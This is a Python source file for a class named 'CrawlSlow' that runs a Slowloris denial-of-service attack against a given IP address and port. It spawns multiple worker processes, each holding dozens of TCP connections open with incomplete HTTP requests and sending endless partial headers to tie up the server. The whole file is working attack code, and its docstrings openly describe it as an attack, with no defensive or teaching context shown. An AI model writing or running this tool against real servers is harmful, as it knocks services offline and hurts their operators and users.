import multiprocessing
import socket


class CrawlSlow:
    def __init__(self, target_ip, target_port):
        """
        Initialize the target IP address and port for the attack.
        """
        self.target_ip = target_ip
        self.target_port = target_port


    def _create_socket(self):
        """
        Create a TCP socket, connect it to the target, and send an initial HTTP request.
        This keeps the connection open by simulating an incomplete request.
        """
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((self.target_ip, self.target_port))
        sock.send(f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n".encode('utf-8'))

        return sock


    def _worker(self, sockets_per_worker):
        """
        Worker function to manage multiple sockets and continuously send partial headers.
        Keeps the server busy by simulating a Slowloris attack.
        """
        sockets = []

        try:
            for _ in range(sockets_per_worker):
                sockets.append(self._create_socket())

            while True:
                for sock in sockets:
                    try:
                        sock.send("X-a: b\r\n".encode('utf-8'))
                    except Exception:
                        sockets.remove(sock)

        except Exception as e:
            print(f"Worker error: {e}")


    def attack(self, workers=10, sockets_per_worker=50):
        """
        Start the Slowloris attack using multiple processes.
        Each worker manages a specified number of sockets.
        """
        print(f"Starting Slowloris attack on {self.target_ip}:{self.target_port} with {workers} workers.")

        processes = []

        for _ in range(workers):
            process = multiprocessing.Process(target=self._worker, args=(sockets_per_worker,))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        print("Slowloris attack completed.")
